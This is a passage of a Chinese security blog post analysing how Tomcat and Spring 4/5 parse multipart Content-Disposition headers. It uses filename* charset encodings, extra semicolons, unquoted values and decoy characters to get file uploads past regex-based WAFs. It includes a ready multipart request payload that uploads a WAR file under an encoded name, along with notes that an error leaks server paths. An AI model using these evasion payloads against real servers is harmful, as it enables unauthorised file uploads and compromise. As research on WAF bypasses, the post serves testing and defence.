class="string">&quot;JIS_X0201&quot;</span>,<span class="string">&quot;JIS_X0212-1990&quot;</span>,<span class="string">&quot;KOI8-R&quot;</span>,<span class="string">&quot;KOI8-U&quot;</span>,<span class="string">&quot;Shift_JIS&quot;</span>,<span class="string">&quot;TIS-620&quot;</span>,<span class="string">&quot;US-ASCII&quot;</span>,<span class="string">&quot;UTF-16&quot;</span>,<span class="string">&quot;UTF-16BE&quot;</span>,<span class="string">&quot;UTF-16LE&quot;</span>,<span class="string">&quot;UTF-32&quot;</span>,<span class="string">&quot;UTF-32BE&quot;</span>,<span class="string">&quot;UTF-32LE&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>,<span class="string">&quot;windows-1250&quot;</span>,<span class="string">&quot;windows-1251&quot;</span>,<span class="string">&quot;windows-1252&quot;</span>,<span class="string">&quot;windows-1253&quot;</span>,<span class="string">&quot;windows-1254&quot;</span>,<span class="string">&quot;windows-1255&quot;</span>,<span class="string">&quot;windows-1256&quot;</span>,<span class="string">&quot;windows-1257&quot;</span>,<span class="string">&quot;windows-1258&quot;</span>,<span class="string">&quot;windows-31j&quot;</span>,<span class="string">&quot;x-Big5-HKSCS-2001&quot;</span>,<span class="string">&quot;x-Big5-Solaris&quot;</span>,<span class="string">&quot;x-COMPOUND_TEXT&quot;</span>,<span class="string">&quot;x-euc-jp-linux&quot;</span>,<span class="string">&quot;x-EUC-TW&quot;</span>,<span class="string">&quot;x-eucJP-Open&quot;</span>,<span class="string">&quot;x-IBM1006&quot;</span>,<span class="string">&quot;x-IBM1025&quot;</span>,<span class="string">&quot;x-IBM1046&quot;</span>,<span class="string">&quot;x-IBM1097&quot;</span>,<span class="string">&quot;x-IBM1098&quot;</span>,<span class="string">&quot;x-IBM1112&quot;</span>,<span class="string">&quot;x-IBM1122&quot;</span>,<span class="string">&quot;x-IBM1123&quot;</span>,<span class="string">&quot;x-IBM1124&quot;</span>,<span class="string">&quot;x-IBM1166&quot;</span>,<span class="string">&quot;x-IBM1364&quot;</span>,<span class="string">&quot;x-IBM1381&quot;</span>,<span class="string">&quot;x-IBM1383&quot;</span>,<span class="string">&quot;x-IBM300&quot;</span>,<span class="string">&quot;x-IBM33722&quot;</span>,<span class="string">&quot;x-IBM737&quot;</span>,<span class="string">&quot;x-IBM833&quot;</span>,<span class="string">&quot;x-IBM834&quot;</span>,<span class="string">&quot;x-IBM856&quot;</span>,<span class="string">&quot;x-IBM874&quot;</span>,<span class="string">&quot;x-IBM875&quot;</span>,<span class="string">&quot;x-IBM921&quot;</span>,<span class="string">&quot;x-IBM922&quot;</span>,<span class="string">&quot;x-IBM930&quot;</span>,<span class="string">&quot;x-IBM933&quot;</span>,<span class="string">&quot;x-IBM935&quot;</span>,<span class="string">&quot;x-IBM937&quot;</span>,<span class="string">&quot;x-IBM939&quot;</span>,<span class="string">&quot;x-IBM942&quot;</span>,<span class="string">&quot;x-IBM942C&quot;</span>,<span class="string">&quot;x-IBM943&quot;</span>,<span class="string">&quot;x-IBM943C&quot;</span>,<span class="string">&quot;x-IBM948&quot;</span>,<span class="string">&quot;x-IBM949&quot;</span>,<span class="string">&quot;x-IBM949C&quot;</span>,<span class="string">&quot;x-IBM950&quot;</span>,<span class="string">&quot;x-IBM964&quot;</span>,<span class="string">&quot;x-IBM970&quot;</span>,<span class="string">&quot;x-ISCII91&quot;</span>,<span class="string">&quot;x-ISO-2022-CN-CNS&quot;</span>,<span class="string">&quot;x-ISO-2022-CN-GB&quot;</span>,<span class="string">&quot;x-iso-8859-11&quot;</span>,<span class="string">&quot;x-JIS0208&quot;</span>,<span class="string">&quot;x-JISAutoDetect&quot;</span>,<span class="string">&quot;x-Johab&quot;</span>,<span class="string">&quot;x-MacArabic&quot;</span>,<span class="string">&quot;x-MacCentralEurope&quot;</span>,<span class="string">&quot;x-MacCroatian&quot;</span>,<span class="string">&quot;x-MacCyrillic&quot;</span>,<span class="string">&quot;x-MacDingbat&quot;</span>,<span class="string">&quot;x-MacGreek&quot;</span>,<span class="string">&quot;x-MacHebrew&quot;</span>,<span class="string">&quot;x-MacIceland&quot;</span>,<span class="string">&quot;x-MacRoman&quot;</span>,<span class="string">&quot;x-MacRomania&quot;</span>,<span class="string">&quot;x-MacSymbol&quot;</span>,<span class="string">&quot;x-MacThai&quot;</span>,<span class="string">&quot;x-MacTurkish&quot;</span>,<span class="string">&quot;x-MacUkraine&quot;</span>,<span class="string">&quot;x-MS932_0213&quot;</span>,<span class="string">&quot;x-MS950-HKSCS&quot;</span>,<span class="string">&quot;x-MS950-HKSCS-XP&quot;</span>,<span class="string">&quot;x-mswin-936&quot;</span>,<span class="string">&quot;x-PCK&quot;</span>,<span class="string">&quot;x-SJIS_0213&quot;</span>,<span class="string">&quot;x-UTF-16LE-BOM&quot;</span>,<span class="string">&quot;X-UTF-32BE-BOM&quot;</span>,<span class="string">&quot;X-UTF-32LE-BOM&quot;</span>,<span class="string">&quot;x-windows-50220&quot;</span>,<span class="string">&quot;x-windows-50221&quot;</span>,<span class="string">&quot;x-windows-874&quot;</span>,<span class="string">&quot;x-windows-949&quot;</span>,<span class="string">&quot;x-windows-950&quot;</span>,<span class="string">&quot;x-windows-iso2022jp&quot;</span>&#125;</span><br></pre></td></tr></table></figure><p>这里作为演示我就随便选一个了<code>UTF-16BE</code></p><p><img src="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/7.png"></p><p>同样的我们也可以进行套娃结合上面的<code>filename=&quot;&quot;y\4.\w\arK&quot;</code>改成<code>filename=&quot;UTF-16BE&#39;Y4tacker&#39;%00%22%00y%00%5C%004%00.%00%5C%00w%00%5C%00a%00r%00K&quot;</code></p><p>接下来处理点小加强，可以看到在这里分隔符无限加，而且加了🌟号的字符之后也会去除一个🌟号</p><p><img src="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/8.png"></p><p>因此我们最终可以得到如下payload，此时仅仅基于正则的waf规则就很有可能会失效</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryQKTY1MomsixvN8vX</span><br><span class="line">Content-Disposition: form-data*;;;;;;;;;;name*=<span class="string">&quot;UTF-16BE&#x27;Y4tacker&#x27;%00d%00e%00p%00l%00o%00y%00W%00a%00r&quot;</span>;;;;;;;;filename*=<span class="string">&quot;UTF-16BE&#x27;Y4tacker&#x27;%00%22%00y%00%5C%004%00.%00%5C%00w%00%5C%00a%00r%00K&quot;</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line"><span class="number">123</span></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryQKTY1MomsixvN8vX--</span><br></pre></td></tr></table></figure><p>可以看见成功上传</p><p><img src="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/9.png"></p><h2 id="变形-更新2022-06-20"><a href="#变形-更新2022-06-20" class="headerlink" title="变形 更新2022-06-20"></a>变形 更新2022-06-20</h2><p>这里测试版本是Tomcat8.5.72，这里也不想再测其他版本差异了只是提供一种思路</p><p>在此基础上我发现还可以做一些新的东西，其实就是对<code>org.apache.tomcat.util.http.fileupload.ParameterParser#parse(char[], int, int, char)</code>函数进行深入分析</p><p>在获取值的时候<code>paramValue = parseQuotedToken(new char[] &#123;separator &#125;);</code>，其实是按照分隔符<code>;</code>分割，因此我们不难想到前面的东西其实可以不用<code>&quot;</code>进行包裹，在parseQuotedToken最后返回调用的是<code>return getToken(true);</code>，这个函数也很简单就不必多解释</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">getToken</span><span class="params">(<span class="keyword">final</span> <span class="keyword">boolean</span> quoted)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// Trim leading white spaces</span></span><br><span class="line">        <span class="keyword">while</span> ((i1 &lt; i2) &amp;&amp; (Character.isWhitespace(chars[i1]))) &#123;</span><br><span class="line">            i1++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Trim trailing white spaces</span></span><br><span class="line">        <span class="keyword">while</span> ((i2 &gt; i1) &amp;&amp; (Character.isWhitespace(chars[i2 - <span class="number">1</span>]))) &#123;</span><br><span class="line">            i2--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Strip away quotation marks if necessary</span></span><br><span class="line">        <span class="keyword">if</span> (quoted</span><br><span class="line">            &amp;&amp; ((i2 - i1) &gt;= <span class="number">2</span>)</span><br><span class="line">            &amp;&amp; (chars[i1] == <span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">            &amp;&amp; (chars[i2 - <span class="number">1</span>] == <span class="string">&#x27;&quot;&#x27;</span>)) &#123;</span><br><span class="line">            i1++;</span><br><span class="line">            i2--;</span><br><span class="line">        &#125;</span><br><span class="line">        String result = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (i2 &gt; i1) &#123;</span><br><span class="line">            result = <span class="keyword">new</span> String(chars, i1, i2 - i1);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到这里也是成功识别的</p><p><img src="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/21.png"></p><p>既然调用<code>parse</code>解析参数时可以不被包裹，结合getToken函数我们可以知道在最后一个参数其实就不必要加<code>;</code>了，并且解析完通过<code>params.get(&quot;filename&quot;)</code>获取到参数后还会调用到<code>org.apache.tomcat.util.http.parser.HttpParser#unquote</code>那也可以基于此再次变形</p><p>为了直观这里就直接明文了，是不是也很神奇</p><p><img src="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/22.png"></p><h2 id="扩大利用面"><a href="#扩大利用面" class="headerlink" title="扩大利用面"></a>扩大利用面</h2><p>现在只是war包的场景，多多少少影响性被降低，但我们这串代码其实抽象出来就一个关键</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Part warPart = request.getPart(<span class="string">&quot;deployWar&quot;</span>);</span><br><span class="line">String filename = warPart.getSubmittedFileName();</span><br></pre></td></tr></table></figure><p>通过查询<a href="https://docs.oracle.com/javaee/7/api/javax/servlet/http/Part.html#getSubmittedFileName--">官方文档</a>，可以发现从Servlet3.1开始，tomcat新增了对此的支持，也就意味着简单通过<code>javax.servlet.http.HttpServletRequest#getParts</code>即可，简化了我们文件上传的代码负担(如果我是开发人员，我肯定首选也会使用，谁不想当懒狗呢)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">getSubmittedFileName</span></span><br><span class="line"><span class="function">String <span class="title">getSubmittedFileName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">Gets the file name specified by the client</span></span><br><span class="line"><span class="function">Returns:</span></span><br><span class="line"><span class="function">the submitted file name</span></span><br><span class="line"><span class="function">Since:</span></span><br><span class="line"><span class="function">Servlet 3.1</span></span><br></pre></td></tr></table></figure><h2 id="更新Spring-2022-06-20"><a href="#更新Spring-2022-06-20" class="headerlink" title="更新Spring 2022-06-20"></a>更新Spring 2022-06-20</h2><p>早上起床想着昨晚和陈师的碰撞，起床后又看了下陈师的星球，看到这个不妨再试试Spring是否也按照了RFC的实现呢（毕竟Spring内置了Tomcat，可能会有类似的呢）</p><p><img src="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/10.png"></p><p>Spring为我们提供了处理文件上传MultipartFile的接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">MultipartFile</span> <span class="keyword">extends</span> <span class="title">InputStreamSource</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">getName</span><span class="params">()</span></span>; <span class="comment">//获取参数名</span></span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    <span class="function">String <span class="title">getOriginalFilename</span><span class="params">()</span></span>;<span class="comment">//原始的文件名</span></span><br><span class="line">    <span class="meta">@Nullable</span></span><br><span class="line">    <span class="function">String <span class="title">getContentType</span><span class="params">()</span></span>;<span class="comment">//内容类型</span></span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">isEmpty</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">long</span> <span class="title">getSize</span><span class="params">()</span></span>; <span class="comment">//大小</span></span><br><span class="line">    <span class="keyword">byte</span>[] getBytes() <span class="keyword">throws</span> IOException;<span class="comment">// 获取字节数组</span></span><br><span class="line">    <span class="function">InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>;<span class="comment">//以流方式进行读取</span></span><br><span class="line">    <span class="function"><span class="keyword">default</span> Resource <span class="title">getResource</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> MultipartFileResource(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 将上传的文件写入文件系统</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">transferTo</span><span class="params">(File var1)</span> <span class="keyword">throws</span> IOException, IllegalStateException</span>;</span><br><span class="line"><span class="comment">// 写入指定path</span></span><br><span class="line">    <span class="function"><span class="keyword">default</span> <span class="keyword">void</span> <span class="title">transferTo</span><span class="params">(Path dest)</span> <span class="keyword">throws</span> IOException, IllegalStateException </span>&#123;</span><br><span class="line">        FileCopyUtils.copy(<span class="keyword">this</span>.getInputStream(), Files.newOutputStream(dest));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而spring处理文件上传逻辑的具体关键逻辑在<code>org.springframework.web.multipart.support.StandardMultipartHttpServletRequest#parseRequest</code>，抄个文件上传demo来进行测试分析</p><h3 id="Spring4"><a href="#Spring4" class="headerlink" title="Spring4"></a>Spring4</h3><p>这里我测试了<code>springboot1.5.20.RELEASE</code>内置<code>Spring4.3.23</code>，具体小版本之间是否有差异这里就不再探究</p><p>其中关于<code>org.springframework.web.multipart.support.StandardMultipartHttpServletRequest#parseRequest</code>的调用也有些不同</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseRequest</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Collection&lt;Part&gt; parts = request.getParts();</span><br><span class="line">        <span class="keyword">this</span>.multipartParameterNames = <span class="keyword">new</span> LinkedHashSet(parts.size());</span><br><span class="line">        MultiValueMap&lt;String, MultipartFile&gt; files = <span class="keyword">new</span> LinkedMultiValueMap(parts.size());</span><br><span class="line">        Iterator var4 = parts.iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            Part part = (Part)var4.next();</span><br><span class="line">            String disposition = part.getHeader(<span class="string">&quot;content-disposition&quot;</span>);</span><br><span class="line">            String filename = <span class="keyword">this</span>.extractFilename(disposition);</span><br><span class="line">            <span class="keyword">if</span> (filename == <span class="keyword">null</span>) &#123;</span><br><span class="line">                filename = <span class="keyword">this</span>.extractFilenameWithCharset(disposition);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (filename != <span class="keyword">null</span>) &#123;</span><br><span class="line">                files.add(part.getName(), <span class="keyword">new</span> StandardMultipartHttpServletRequest.StandardMultipartFile(part, filename));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.multipartParameterNames.add(part.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">this</span>.setMultipartFiles(files);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable var8) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MultipartException(<span class="string">&quot;Could not parse multipart servlet request&quot;</span>, var8);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单看了下和tomcat之前的分析很像，这里Spring4当中同时也是支持<code>filename*</code>格式的</p><p><img src="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/14.png"></p><p>看看具体逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">extractFilename</span><span class="params">(String contentDisposition, String key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (contentDisposition == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">int</span> startIndex = contentDisposition.indexOf(key);</span><br><span class="line">            <span class="keyword">if</span> (startIndex == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="comment">//截取filename=后面的内容</span></span><br><span class="line">                String filename = contentDisposition.substring(startIndex + key.length());</span><br><span class="line">                <span class="keyword">int</span> endIndex;</span><br><span class="line">              <span class="comment">//如果后面开头是“则截取”“之间的内容</span></span><br><span class="line">                <span class="keyword">if</span> (filename.startsWith(<span class="string">&quot;\&quot;&quot;</span>)) &#123;</span><br><span class="line">                    endIndex = filename.indexOf(<span class="string">&quot;\&quot;&quot;</span>, <span class="number">1</span>);</span><br><span class="line">                    <span class="keyword">if</span> (endIndex != -<span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> filename.substring(<span class="number">1</span>, endIndex);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                  <span class="comment">//可以看到如果没有“”包裹其实也可以，这和当时陈师分享的其中一个trick是符合的</span></span><br><span class="line">                    endIndex = filename.indexOf(<span class="string">&quot;;&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (endIndex != -<span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> filename.substring(<span class="number">0</span>, endIndex);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> filename;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>简单测试一波，与心中结果一致</p><p><img src="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/15.png"></p><p><img src="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/16.png">同时由于indexof默认取第一位，因此我们还可以加一些干扰字符尝试突破waf逻辑</p><p><img src="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/17.png"></p><p>如果filename*开头但是spring4当中没有关于url解码的部分</p><p><img src="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/18.png"></p><p>没有这部分会出现什么呢？我们只能自己发包前解码，这样的话如果出现00字节就会报错，报错后</p><p><img src="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/19.png"></p><p>看起来是spring框架解析header的原因，但是这里报错信息也很有趣将项目地址的绝对路径抛出了，感觉不失为信息收集的一种方式</p><h3 id="Spring5"><a href="#Spring5" class="headerlink" title="Spring5"></a>Spring5</h3><p>也是随便来个新的springboot2.6.4的，来看看spring5的，小版本间差异不测了，经过测试发现spring5和spring4之间也是有版本差异处理也有些不同，同样是在<code>parseRequest</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseRequest</span><span class="params">(HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Collection&lt;Part&gt; parts = request.getParts();</span><br><span class="line">            <span class="keyword">this</span>.multipartParameterNames = <span class="keyword">new</span> LinkedHashSet(parts.size());</span><br><span class="line">            MultiValueMap&lt;String, MultipartFile&gt; files = <span class="keyword">new</span> LinkedMultiValueMap(parts.size());</span><br><span class="line">            Iterator var4 = parts.iterator();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">                Part part = (Part)var4.next();</span><br><span class="line">                String headerValue = part.getHeader(<span class="string">&quot;Content-Disposition&quot;</span>);</span><br><span class="line">                ContentDisposition disposition = ContentDisposition.parse(headerValue);</span><br><span class="line">                String filename = disposition.getFilename();</span><br><span class="line">                <span class="keyword">if</span> (filename != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (filename.startsWith(<span class="string">&quot;=?&quot;</span>) &amp;&amp; filename.endsWith(<span class="string">&quot;?=&quot;</span>)) &#123;</span><br><span class="line">                        filename = StandardMultipartHttpServletRequest.MimeDelegate.decode(filename);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    files.add(part.getName(), <span class="keyword">new</span> StandardMultipartHttpServletRequest.StandardMultipartFile(part, filename));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">this</span>.multipartParameterNames.add(part.getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.setMultipartFiles(files);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable var9) &#123;</span><br><span class="line">            <span class="keyword">this</span>.handleParseFailure(var9);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>很明显可以看到这一行<code>filename.startsWith(&quot;=?&quot;) &amp;&amp; filename.endsWith(&quot;?=&quot;)</code>，可以看出Spring对文件名也是支持QP编码</p><p>在上面能看到还调用了一个解析的方法<code>org.springframework.http.ContentDisposition#parse</code></p><p>，多半就是这里了,那么继续深入下</p><p>可以看到一方面是QP编码，另一方面也是支持<code>filename*</code>,同样获取值是截取<code>&quot;</code>之间的或者没找到就直接截取<code>=</code>后面的部分</p><p><img src="/2022/06/19/year/2022/6/%E6%8E%A2%E5%AF%BBTomcat%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%B5%81%E9%87%8F%E5%B1%82%E9%9D%A2%E7%BB%95waf%E6%96%B0%E5%A7%BF%E5%8A%BF/11.png"></p><p>如果是<code>filename*</code>后面的处理逻辑就是else分之，可以看出和我们上面分析spring4还是有点区别就是这里只支持<code>UTF-8/ISO-8859-1/US_ASCII</code>，编码受限制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> idx1 = value.indexOf(<span class="number">39</span>);</span><br><span class="line"><span class="keyword">int</span> idx2 = value.indexOf(<span class="number">39</span>, idx1 + <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (idx1 != -<span class="number">1</span> &amp;&amp; idx2 != -<span class="number">1</span>) &#123;</span><br><span class="line">  charset = Charset.forName(value.substring(<span class="number">0</span>, idx1).trim());</span><br><span class="line">  Assert.isTrue(StandardCharsets.UTF_8.equals(charset) || StandardCharsets.ISO_8859_1.equals(charset), <span class="string">&quot;Charset should be UTF-8 or ISO-8859-1&quot;</span>);</span><br><span class="line">  filename = decodeFilename(value.substring(idx2 + <span class="number">1</span>), charset);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  filename = decodeFilename(value, StandardCharsets.US_ASCII);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但其实仔细想这个结果是符合RFC文档要求的</p><p><img 